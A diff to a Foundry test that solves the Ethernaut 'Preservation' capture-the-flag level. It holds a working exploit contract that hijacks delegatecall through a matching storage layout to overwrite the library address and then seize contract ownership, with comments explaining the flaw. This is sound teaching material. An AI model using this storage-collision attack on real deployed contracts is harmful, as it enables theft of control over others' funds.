@@ -10,13 +10,11 @@ import "../src/Ethernaut.sol";
 contract PreservationTest is Test {
     Ethernaut ethernaut;
     address player = address(100);
-    address player2 = address(200);
 
     function setUp() public {
         // create new instance of ethernaut
         ethernaut = new Ethernaut();
         vm.deal(player, 5 ether); // give our address 5 ether
-        vm.deal(player2, 1 ether);
     }
 
     function testPreservationHack() public {
@@ -35,11 +33,24 @@ contract PreservationTest is Test {
          *************** */
         PreservationHack preservationHack = new PreservationHack(levelAddress);
         /*
-         *
-         */
-        ethernautPreservation.setFirstTime(uint256(address(preservationHack)));
-        ethernautPreservation.setFirstTime(uint256(player));
+        * This challenge teaches us something very important.
+        * It's not recommended to use external contract to update a contract state
+        *
+        * When the Preservation contract execute setFirstTime(UINT) it actually calls
+        *   LibraryContract.setTime(UINT) via delegate call
+        * 
+        * By setting up a hack contract, with the exact same storage layout
+        * We can re-define the setTime function to also update the owner.
+        * Calling setFirstTime will make a delegate call to timeZone1Library
+        * Which, in our case is the hack contract. So it will call the setTime function with the addres of the contract
+        * Then we can call it a second time to make msg.sender the owner
+        *  In our case --> player.
+        *
+        */
 
+        vm.roll(5); // prevent underflow
+        preservationHack.attack();
+        assertEq(ethernautPreservation.owner(), player);
         /*****************
          *Level Submission*
          ***************  */
@@ -52,18 +63,26 @@ contract PreservationTest is Test {
 }
 
 contract PreservationHack {
-    Preservation challenge;
-    // mimim the `Preservation` contract layout structure
+    // same storage layout as victim
     address public timeZone1Library;
     address public timeZone2Library;
     address public owner;
+    uint storedTime;
+
+    Preservation public challenge;
 
     constructor(address _victim) {
         challenge = Preservation(_victim);
     }
 
     function setTime(uint256 time) public {
-        // Convert the `time` input to an `address` and update the `owner` state variable
-        owner = address(time);
+        // here time == address !
+        // we jut have to cast it back from uint 256 <-> address
+        owner = address(uint160(time));
+    }
+
+    function attack() external {
+        challenge.setFirstTime(uint256(uint160(address(this))));
+        challenge.setFirstTime(uint256(uint160(msg.sender)));
     }
 }
